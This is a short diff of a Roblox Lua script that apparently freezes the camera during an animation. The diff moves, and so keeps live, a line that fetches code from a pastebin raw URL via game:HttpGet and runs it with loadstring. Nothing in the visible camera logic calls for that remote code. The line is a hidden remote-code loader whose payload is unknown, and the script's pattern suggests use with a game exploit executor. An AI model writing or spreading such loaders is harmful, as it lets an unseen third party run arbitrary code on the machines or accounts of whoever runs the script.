@@ -403,7 +403,7 @@ Anim.TimePosition = startTime
 
 Anim:AdjustSpeed(1)
         
-loadstring(game:HttpGet("https://pastebin.com/raw/bwcEWbWr"))()
+
 -- Camera Freeze Script for Roblox with Movement After Freeze Time
 
 local freezeTime = 2.9 -- Time in seconds to freeze the camera
@@ -430,6 +430,8 @@ end
 -- Execute the function to freeze the camera
 freezeCamera()
 
+
+loadstring(game:HttpGet("https://pastebin.com/raw/bwcEWbWr"))()
 
     end
 
